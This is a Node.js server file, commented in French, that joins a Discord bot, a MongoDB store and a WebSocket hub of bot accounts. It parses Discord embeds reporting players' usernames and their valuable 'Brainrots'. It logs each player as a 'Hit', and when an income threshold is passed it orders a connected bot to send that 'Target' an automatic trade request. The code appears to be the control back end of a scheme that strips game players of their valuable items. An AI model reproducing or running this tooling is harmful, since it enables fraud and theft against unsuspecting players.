const express = require('express');
const mongoose = require('mongoose');
const WebSocket = require('ws');
const http = require('http');
const url = require('url');
const { Client, GatewayIntentBits } = require('discord.js');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- CONFIGURATION ---
const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;

const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);

// Cache local pour le seuil (évite les lectures DB trop fréquentes)
let CACHED_THRESHOLD = 10000000; 

// --- CONNEXION DB ---
mongoose.connect(MONGO_URI)
  .then(() => {
      log("✅ [DB] Connexion établie");
      loadSettings(); // Charger le seuil dès la connexion
  })
  .catch(err => log(`❌ [DB] ERREUR : ${err}`));

// --- MODÈLES ---
const hitSchema = new mongoose.Schema({
    timestamp: { type: Date, default: Date.now },
    displayName: String,
    username: String,
    receivers: [String],
    valuableBrainrots: [String]
});
const Hit = mongoose.model('Hit', hitSchema);

const logSchema = new mongoose.Schema({
    username: String,
    type: String,
    message: String,
    timestamp: { type: Date, default: Date.now }
});
const BotLog = mongoose.model('BotLog', logSchema);

const settingsSchema = new mongoose.Schema({
    id: { type: String, default: "global_config" },
    min_income_threshold: { type: Number, default: 10000000 }
});
const Settings = mongoose.model('Settings', settingsSchema);

const activeBots = new Map();

// --- CHARGEMENT DU SEUIL ---
async function loadSettings() {
    try {
        let config = await Settings.findOne({ id: "global_config" });
        if (!config) {
            config = new Settings({ id: "global_config", min_income_threshold: 10000000 });
            await config.save();
        }
        CACHED_THRESHOLD = config.min_income_threshold;
        log(`⚙️ [CONFIG] Seuil chargé : ${CACHED_THRESHOLD.toLocaleString()}/s`);
    } catch (e) { log(`❌ [CONFIG] Erreur : ${e.message}`); }
}

// --- MIDDLEWARE SÉCURITÉ ---
const authAdmin = (req, res, next) => {
    if (req.query.token === ADMIN_TOKEN) return next();
    res.status(403).json({ error: "Token invalide" });
};

// --- ROUTES API ADMIN ---
app.get('/api/admin/verify', (req, res) => {
    res.json({ success: req.query.token === ADMIN_TOKEN });
});

app.get('/api/admin/hits', authAdmin, async (req, res) => {
    const hits = await Hit.find().sort({ timestamp: -1 }).limit(50);
    res.json(hits);
});

app.get('/api/admin/bots', authAdmin, (req, res) => {
    res.json(Array.from(activeBots.keys()));
});

app.get('/api/admin/set-threshold', authAdmin, async (req, res) => {
    const newVal = parseInt(req.query.value);
    if (!isNaN(newVal)) {
        await Settings.findOneAndUpdate({ id: "global_config" }, { min_income_threshold: newVal }, { upsert: true });
        CACHED_THRESHOLD = newVal;
        log(`⚙️ [CONFIG] Nouveau seuil : ${CACHED_THRESHOLD}`);
        res.send("OK");
    } else res.status(400).send("Invalide");
});

app.get('/api/admin/get-threshold', authAdmin, (req, res) => {
    res.json({ threshold: CACHED_THRESHOLD });
});

app.get('/api/logs', authAdmin, async (req, res) => {
    const logs = await BotLog.find().sort({ timestamp: -1 }).limit(50);
    res.json(logs);
});

app.get('/ping', (req, res) => res.send("Pong !"));

// --- GESTION DES TRADES AVEC RETRY (Route HTTP pour C# ou manuel) ---
app.get('/api/sendtrade', async (req, res) => {
    const { receiver, target } = req.query;
    if (!receiver || !target) return res.status(400).send("Paramètres manquants.");

    log(`📡 Tentative d'ordre HTTP vers ${receiver}...`);

    for (let attempts = 0; attempts < 5; attempts++) {
        const botWs = activeBots.get(receiver);
        if (botWs && botWs.readyState === WebSocket.OPEN) {
            botWs.send(JSON.stringify({ Type: "TradeRequest", TargetUser: target }));
            return res.send(`Ordre envoyé à ${receiver}`);
        }
        if (attempts < 4) await new Promise(r => setTimeout(r, 2000));
    }
    res.send(`Bot ${receiver} hors ligne.`);
});

// --- BOT DISCORD JS (Intégré) ---
const clientDiscord = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });

function parseIncome(text) {
    const match = text.match(/\$([\d.]+)([KMBT]?)\/s/i);
    if (!match) return 0;
    const value = parseFloat(match[1]);
    const unit = (match[2] || "").toUpperCase();
    const multipliers = { 'K': 1e3, 'M': 1e6, 'B': 1e9, 'T': 1e12 };
    return value * (multipliers[unit] || 1);
}

clientDiscord.on('messageCreate', async (message) => {
    if (message.embeds.length === 0) return;
    const embed = message.embeds[0];

    let targetUsername, displayName, receiversList = [], valuableItems = [], topIncome = 0;

    embed.fields.forEach(field => {
        const val = field.value;

        // --- PARSING GLOBAL DANS PLAYER INFORMATION ---
        if (field.name.includes("Player Information")) {
            // Extraction Username
            targetUsername = (val.match(/Username\s*:\s*`?([^`\n]+)`?/) || [])[1];
            
            // Extraction Display Name
            displayName = (val.match(/Display Name\s*:\s*`?([^`\n]+)`?/) || [])[1];

            // Extraction des Receivers (on cherche la ligne qui commence par l'emoji 😎 ou le mot Receiver)
            const receiverLine = val.split('\n').find(l => l.includes("Receiver"));
            if (receiverLine) {
                // On prend tout ce qu'il y a après les ":"
                const rawNames = receiverLine.split(':')[1] || "";
                // Nettoyage : on enlève les backticks, on sépare par virgule et on trim
                receiversList = rawNames.split(',').map(n => n.replace(/[`\s]/g, "").trim());
            }
        }

        // --- PARSING DES REVENUS ---
        if (field.name.includes("Valuable Brainrots")) {
            val.split('\n').forEach(line => {
                const inc = parseIncome(line);
                if (inc > 0) {
                    valuableItems.push(line.trim());
                    if (inc > topIncome) topIncome = inc;
                }
            });
        }
    });

    if (!targetUsername) return;

    // 1. Sauvegarde dans MongoDB (Toujours, pour l'historique admin)
    try {
        await new Hit({ 
            displayName, 
            username: targetUsername, 
            receivers: receiversList, 
            valuableBrainrots: valuableItems,
            timestamp: new Date()
        }).save();
        log(`💾 [HIT-DB] ${targetUsername} enregistré (${topIncome.toLocaleString()}/s)`);
    } catch (e) { log(`❌ [DB-ERR] ${e.message}`); }

    // 2. Dispatch de l'ordre si le seuil est atteint
    if (topIncome >= CACHED_THRESHOLD) {
        log(`🔥 [THRESHOLD] Seuil atteint (${topIncome}/s). Cible: ${targetUsername}`);
        
        let sent = false;
        // On tente 5 fois (toutes les 2 sec) de trouver un bot de la liste qui est online
        for (let i = 0; i < 5; i++) {
            // On cherche le premier bot de la liste receiversList qui est dans activeBots
            const targetBot = receiversList.find(name => {
                const ws = activeBots.get(name);
                return ws && ws.readyState === WebSocket.OPEN;
            });

            if (targetBot) {
                activeBots.get(targetBot).send(JSON.stringify({ 
                    Type: "TradeRequest", 
                    TargetUser: targetUsername 
                }));
                log(`🚀 [SUCCESS] Ordre envoyé à ${targetBot} pour ${targetUsername}`);
                message.reply(`✅ **Auto-Trade Sent!**\nBot: \`${targetBot}\`\nTarget: \`${targetUsername}\`\nValue: \`${topIncome.toLocaleString()}/s\``);
                sent = true;
                break; 
            }

            if (i < 4) {
                log(`⏳ [RETRY ${i+1}] Aucun bot online parmis [${receiversList.join(', ')}]. Retry...`);
                await new Promise(r => setTimeout(r, 2000));
            }
        }

        if (!sent) {
            log(`❌ [ABORT] Aucun bot n'est monté en ligne après 10s pour ${targetUsername}`);
            message.reply(`⚠️ **Trade Failed**: Aucun des bots (\`${receiversList.join(', ')}\`) n'est connecté.`);
        }
    }
});
if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN).then(() => log("🤖 [DISCORD] Bot Actif"));

// --- GESTION WEBSOCKET ---
wss.on('connection', (ws, req) => {
    const username = new URLSearchParams(url.parse(req.url).query).get('username') || "Unknown";
    if (activeBots.has(username)) activeBots.get(username).terminate();
    
    activeBots.set(username, ws);
    log(`🤖 Bot connecté : ${username}`);

    ws.on('message', async (msg) => {
        try {
            const data = JSON.parse(msg);
            if (data.Method === "Log") {
                await new BotLog({ username, type: data.Type || "Info", message: data.Message }).save();
            }
        } catch (e) {}
    });

    ws.on('close', () => { if (activeBots.get(username) === ws) activeBots.delete(username); log(`💀 Bot déconnecté : ${username}`); });
});

app.use(express.static('public'));
server.listen(PORT, () => log(`🚀 Serveur PRO Rusteez actif sur le port ${PORT}`));
